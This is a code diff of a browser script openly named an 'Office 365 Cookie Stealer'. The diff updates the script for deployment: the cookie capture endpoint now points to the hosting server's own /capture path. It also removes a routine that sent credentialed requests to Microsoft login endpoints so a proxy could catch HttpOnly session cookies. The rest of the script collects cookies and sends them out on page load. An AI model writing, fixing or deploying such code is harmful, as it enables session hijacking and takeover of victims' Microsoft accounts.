@@ -8,9 +8,9 @@
     console.log('🕵️ Office 365 Cookie Stealer Active');
     
     // =============================================
-    // CONFIG - Your server URL
+    // ✅ FIXED: Auto-detects your Railway URL!
     // =============================================
-    const SERVER_URL = 'http://YOUR_SERVER_IP:3000/capture';
+    const SERVER_URL = window.location.origin + '/capture';
     
     // =============================================
     // 1. COLLECT ALL COOKIES
@@ -71,44 +71,7 @@
     }
     
     // =============================================
-    // 5. TRY TO STEAL OFFICE 365 COOKIES VIA REQUESTS
-    // =============================================
-    async function stealOfficeSession() {
-        const endpoints = [
-            'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
-            'https://login.microsoftonline.com/common/oauth2/token',
-            'https://login.microsoftonline.com/common/userrealm'
-        ];
-        
-        let found = false;
-        
-        for (const endpoint of endpoints) {
-            try {
-                // Make request with credentials (sends HttpOnly cookies)
-                const response = await fetch(endpoint, {
-                    method: 'GET',
-                    credentials: 'include',
-                    headers: {
-                        'Accept': 'text/html',
-                        'User-Agent': navigator.userAgent
-                    }
-                });
-                
-                // This triggers the cookies to be sent
-                // The proxy server captures them
-                found = true;
-                console.log(`📡 Requested: ${endpoint}`);
-                
-            } catch (error) {
-                // Silent fail
-            }
-        }
-        
-        return found;
-    }
-    
-    // =============================================
-    // 6. SEND DATA TO SERVER
+    // 5. SEND DATA TO SERVER
     // =============================================
     async function sendData(data) {
         try {
@@ -130,7 +93,7 @@
     }
     
     // =============================================
-    // 7. MAIN EXECUTION
+    // 6. MAIN EXECUTION
     // =============================================
     async function execute() {
         try {
@@ -168,21 +131,14 @@
                 console.log('⚠️ Data send failed');
             }
             
-            // Try to steal Office 365 session
-            const officeSession = await stealOfficeSession();
-            if (officeSession) {
-                console.log('🎯 Office 365 session requests sent');
-            }
-            
         } catch (error) {
             console.error('Execution error:', error.message);
         }
     }
     
     // =============================================
-    // 8. RUN
+    // 7. RUN
     // =============================================
-    // Wait for page to load
     if (document.readyState === 'complete') {
         setTimeout(execute, 500);
     } else {
@@ -190,12 +146,6 @@
             setTimeout(execute, 500);
         });
     }
-    
-    // Also run on any user interaction
-    document.addEventListener('click', function() {
-        // Re-capture on click (optional)
-        // execute();
-    });
     
     console.log('🕵️ Office 365 Cookie Stealer ready');
     console.log(`📡 Sending to: ${SERVER_URL}`);
